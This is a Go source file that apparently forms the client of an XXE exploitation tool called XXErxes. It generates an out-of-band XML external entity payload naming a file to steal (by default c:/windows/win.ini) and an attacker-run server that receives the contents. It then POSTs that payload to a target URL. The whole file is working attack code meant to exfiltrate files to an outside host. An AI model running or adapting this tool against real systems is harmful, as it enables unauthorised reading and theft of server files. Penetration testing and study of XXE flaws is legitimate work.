package main

import (
	"bytes"
	"encoding/base64"
	"flag"
	"io/ioutil"
	"log"
	"net/http"

	xxerxes "github.com/pakesson/XXErxes"
)

const (
	defaultHTTPPort       string = ":80"
	defaultExfilFile      string = "c:/windows/win.ini"
	defaultPayloadVariant string = "oob"
)

type config struct {
	Host       string
	HTTPPort   string
	ExfilFile  string
	Target     string
	PayloadKey string
}

func main() {
	rhostPtr := flag.String("rhost", "", "External address of the XXErxes server")
	rportPtr := flag.String("rport", defaultHTTPPort, "Remote HTTP port used on the XXErxes server")
	targetPtr := flag.String("target", "", "Target URL")
	filePtr := flag.String("file", defaultExfilFile, "File to exfiltrate")
	payloadVariantPtr := flag.String("payload", defaultPayloadVariant, "Payload variant")
	verbosePtr := flag.Bool("verbose", false, "Verbose mode")

	flag.Parse()

	if *rhostPtr == "" {
		flag.Usage()
		return
	}

	if *targetPtr == "" {
		flag.Usage()
		return
	}

	cfg := config{
		Host:       *rhostPtr,
		HTTPPort:   *rportPtr,
		ExfilFile:  *filePtr,
		Target:     *targetPtr,
		PayloadKey: *payloadVariantPtr,
	}
	encodedFile := base64.URLEncoding.EncodeToString([]byte(cfg.ExfilFile))

	vals := xxerxes.PayloadTemplateValues{
		File:     encodedFile,
		RHost:    cfg.Host,
		HTTPPort: cfg.HTTPPort,
	}

	payload, err := xxerxes.GeneratePayload(cfg.PayloadKey, vals)
	if err != nil {
		log.Fatal(err)
	}

	if *verbosePtr {
		log.Println("Payload: " + payload)
	}

	req, err := http.NewRequest("POST", cfg.Target, bytes.NewBufferString(payload))

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	if *verbosePtr {
		log.Println("Status: ", resp.Status)
		log.Println("Headers: ", resp.Header)
	}

	body, _ := ioutil.ReadAll(resp.Body)

	if *verbosePtr {
		log.Println("Body: ", string(body))
	}
}
